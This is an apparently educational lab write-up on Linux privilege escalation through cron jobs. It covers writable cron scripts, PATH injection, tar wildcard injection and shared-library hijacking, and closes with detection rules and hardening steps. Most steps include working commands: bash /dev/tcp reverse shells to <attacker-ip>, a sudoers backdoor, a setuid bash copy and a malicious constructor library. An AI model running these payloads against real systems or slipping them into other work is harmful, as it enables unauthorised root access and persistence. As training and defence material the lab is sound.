---
title: "Linux PrivEsc Lab 2 — Cron Jobs and Writable Files"
tags: [linux, privilege-escalation, cron, writable-files, PATH-injection,
       wildcard-injection, pspy, T1053.003, T1574, ATT&CK, hands-on]
module: 04-BroadSurface-04
day: 236
related_topics:
  - Linux PrivEsc Enumeration (Day 234)
  - Linux PrivEsc Lab 1 — SUID and Sudo (Day 235)
  - Kernel Exploits (Day 237)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 236 — Linux PrivEsc Lab 2: Cron Jobs and Writable Files

> "Cron is root's to-do list. It runs on a schedule, with no one watching,
> as root. If anything on that list touches a file you can write to — the
> script, a library it loads, a directory in its PATH — you own the next
> scheduled execution. You do not break in; you just wait for root to hand
> you the keys."
>
> — Ghost

---

## Goals

By the end of this lab you will have:

1. Discovered hidden cron jobs using pspy (no root access required).
2. Exploited a writable cron script to gain a root shell.
3. Exploited a cron PATH injection vulnerability.
4. Exploited a cron wildcard injection using tar's checkpoint feature.
5. Exploited a writable library loaded by a privileged process.

**Time budget:** 4–5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Linux PrivEsc enumeration workflow | Day 234 |
| Cron syntax and scheduling | Days 9–16 |
| Bash scripting basics | Days 9–16 |

---

## Lab Setup

```bash
cd 04-BroadSurface-04/samples/privesc-lab-2/
docker compose up -d

# Lab container has:
# - User: labuser / labuser123
# - Root cron jobs running every minute
# - Three cron-based escalation paths

docker exec -it -u labuser privesc-lab-2 bash
```

---

## Part 1 — Discovering Cron Jobs with pspy

Standard cron enumeration (`crontab -l`, `/etc/crontab`) only shows what
you have permission to read. Root's personal crontab is at `/var/spool/cron/crontabs/root`
— not readable by labuser. pspy watches the kernel's process table for new
processes and shows you every command that runs, including cron jobs.

```bash
# Transfer pspy to the target
wget http://<attacker-ip>:8000/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy

# Run pspy and watch for UID=0 processes
/tmp/pspy 2>/dev/null | tee /tmp/pspy-out.txt &
# Wait 2–3 minutes — cron runs every minute

# Kill pspy
kill %1

# Review output
cat /tmp/pspy-out.txt | grep "UID=0"

# Expected: you will see root running something like:
# UID=0 PID=... CMD=/bin/bash /opt/backup/run-backup.sh
# UID=0 PID=... CMD=/usr/bin/tar -czf /backups/data.tar.gz /var/data/*
# UID=0 PID=... CMD=/bin/bash /home/labuser/tasks/cleanup.sh
```

---

## Part 2 — Writable Cron Script

The simplest cron exploitation: root runs a script you can write to.

```bash
# Find the script pspy revealed
ls -la /opt/backup/run-backup.sh

# If writable:
# -rwxrwxr-x 1 root root ... /opt/backup/run-backup.sh
# → your user (or the world) can write to it

# Inject a reverse shell payload
cat >> /opt/backup/run-backup.sh << 'EOF'
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF

# Start listener on your attacker machine:
nc -lvnp 4444

# Wait for the next cron execution (up to 1 minute)
# Shell arrives as root
id  # uid=0(root)
```

**Alternative: add a root backdoor instead of a shell**
```bash
cat >> /opt/backup/run-backup.sh << 'EOF'
echo 'labuser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
EOF
# Wait for cron to run, then: sudo bash
```

---

## Part 3 — Cron PATH Injection

If a cron job runs a command without a full path, cron uses its own `PATH`
variable. You can prepend a writable directory to that PATH and place a
malicious binary with the same name.

```bash
# Read /etc/crontab and look at the PATH line:
cat /etc/crontab
# Example:
# PATH=/usr/local/sbin:/usr/local/bin:/home/labuser:/usr/sbin:/usr/bin:/sbin:/bin
# * * * * * root cleanup.sh

# /home/labuser is in the PATH and you own it
# 'cleanup.sh' has no full path → cron searches PATH directories in order

# Create a malicious cleanup.sh in /home/labuser
cat > /home/labuser/cleanup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/labuser/cleanup.sh

# Wait for the cron job to run
# Then:
/tmp/rootbash -p
id  # euid=0(root)
```

**Key insight:** The cron `PATH` variable is often more permissive than a
user's login PATH. Always check `/etc/crontab` — not just the job lines,
but the `PATH=` declaration at the top.

---

## Part 4 — Wildcard Injection in Cron (tar)

When a cron job uses shell globbing (`*`) in a command, file names in the
expanded directory are treated as arguments. If you can create files in that
directory, you can inject arguments.

```bash
# pspy reveals root running:
# /usr/bin/tar -czf /backups/data.tar.gz /var/data/*

# You have write access to /var/data/
ls -la /var/data/  # writable by labuser

# tar has two checkpoint features that execute commands:
# --checkpoint=1     → trigger checkpoint on every record
# --checkpoint-action=exec=<cmd>  → execute command at each checkpoint

# Create files whose names ARE the arguments:
cd /var/data/
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh revshell.sh'

# Create the payload script
cat > /var/data/revshell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF
chmod +x /var/data/revshell.sh

# Start listener:
nc -lvnp 4444

# Wait for cron to run tar:
# tar sees: -czf /backups/data.tar.gz --checkpoint=1 --checkpoint-action=exec=sh revshell.sh <other-files>
# tar executes revshell.sh as root
```

**Other binaries vulnerable to wildcard injection:**
- `chown user:group *` → create file `--reference=/etc/shadow`
- `chmod 644 *` → create file `--reference=/etc/shadow`
- `rsync * /backup/` → create file `-e sh /tmp/revshell.sh`

---

## Part 5 — Writable Library (LD_PRELOAD Abuse via Cron)

If a cron job runs a binary that loads shared libraries from a directory you
can write to, you can replace or inject a library.

```bash
# A cron job runs /opt/monitor/monitor-service (binary, not script)
# Check which libraries it loads:
ldd /opt/monitor/monitor-service
# libmonitor.so.1 => /opt/monitor/lib/libmonitor.so.1

# Check if that library or its directory is writable
ls -la /opt/monitor/lib/
# -rw-rw-r-- 1 root labuser ... libmonitor.so.1
# Group-writable by labuser!

# Write a malicious shared library that runs at load time:
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Replace the library
cp /tmp/evil.so /opt/monitor/lib/libmonitor.so.1

# When cron runs monitor-service, it loads libmonitor.so.1
# which immediately executes our constructor function as root
```

---

## Part 6 — Detection and Hardening

### Detecting Cron Exploitation

```bash
# auditd: watch for modifications to cron scripts
-w /etc/cron.d -p wa -k cron_modification
-w /etc/crontab -p wa -k cron_modification
-w /var/spool/cron -p wa -k cron_modification
-w /opt/backup -p wa -k cron_script_modification

# Monitor for unexpected processes spawned by crond
# SIEM pattern:
# process.parent.name: cron OR process.parent.name: crond
# AND process.name: (bash OR sh OR nc OR python* OR perl)
# AND NOT process.command_line contains '/opt/backup/run-backup.sh'
```

### Hardening Cron Jobs

```bash
# 1. Use full paths for all commands in cron
# BAD:  * * * * * root cleanup.sh
# GOOD: * * * * * root /opt/scripts/cleanup.sh

# 2. Set a restrictive PATH in /etc/crontab
# GOOD: PATH=/usr/bin:/bin  (no user-writable directories)

# 3. Cron scripts should be owned by root and not writable by others
chmod 750 /opt/backup/run-backup.sh
chown root:root /opt/backup/run-backup.sh

# 4. Avoid wildcards in cron commands that process user-controlled directories
# BAD:  tar -czf /backup/data.tar.gz /data/*
# GOOD: find /data -print0 | tar -czf /backup/data.tar.gz --null -T -

# 5. Use AppArmor or SELinux profiles to restrict what cron scripts can do
# An AppArmor profile for a backup script prevents it from spawning shells
```

---

## Key Takeaways

1. **pspy is essential.** You cannot enumerate root's crontab directly as a
   low-privilege user. pspy bypasses this — it reads `/proc` instead of cron
   tables. Always run it for 2–3 minutes before concluding there are no
   interesting cron jobs.
2. **Writable scripts are the easiest path.** Any script run by root that
   you can write to is an instant escalation. Check permissions on every
   file discovered by pspy — not just the main script but any file it sources
   or calls.
3. **Wildcard injection is often overlooked.** It requires careful reading of
   the cron command. `*` in a tar or rsync command in a writable directory
   is the clue. GTFOBins documents the tar wildcard technique but it applies
   to other binaries too.
4. **PATH injection requires reading the cron PATH, not your PATH.** Your
   login PATH and cron's PATH are different. Always check the `PATH=` line
   in `/etc/crontab` — not your `$PATH`.
5. **Library hijacking persists.** Unlike a reverse shell that dies when the
   listener closes, a replaced library re-executes every time the cron job
   runs. This is a persistence mechanism — clean it up once you have root
   access.

---

## Exercises

1. Write a cron job monitoring script in bash that: (a) lists all active cron
   jobs (system + user), (b) checks each script called by cron for
   world-writable permissions, (c) checks each directory in cron's PATH
   for world-writable permissions. Output a summary of risks found.

2. Build a Docker container with two deliberate cron misconfiguration paths
   (writable script + wildcard injection). Document the setup so someone
   else can use it as a lab environment.

3. Research: how does `systemd` timers interact with this attack surface?
   Can a systemd timer be exploited the same way as a cron job? What is the
   analogous attack for a writable ExecStart script in a systemd unit file
   owned by root?

4. What is the `cron.allow` and `cron.deny` file? What happens when a regular
   user adds a crontab entry that runs a privileged operation? Can this lead to
   privilege escalation — and under what conditions?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q236.1, Q236.2 …).
> Follow-up questions use hierarchical numbering (Q236.1.1, Q236.1.2 …).

---

## Navigation

← Previous: [Day 235 — Linux PrivEsc Lab 1: SUID and Sudo](DAY-0235-Linux-PrivEsc-Lab-1-SUID-Sudo.md)
→ Next: [Day 237 — Kernel Exploits: Linux](DAY-0237-Kernel-Exploits-Linux.md)
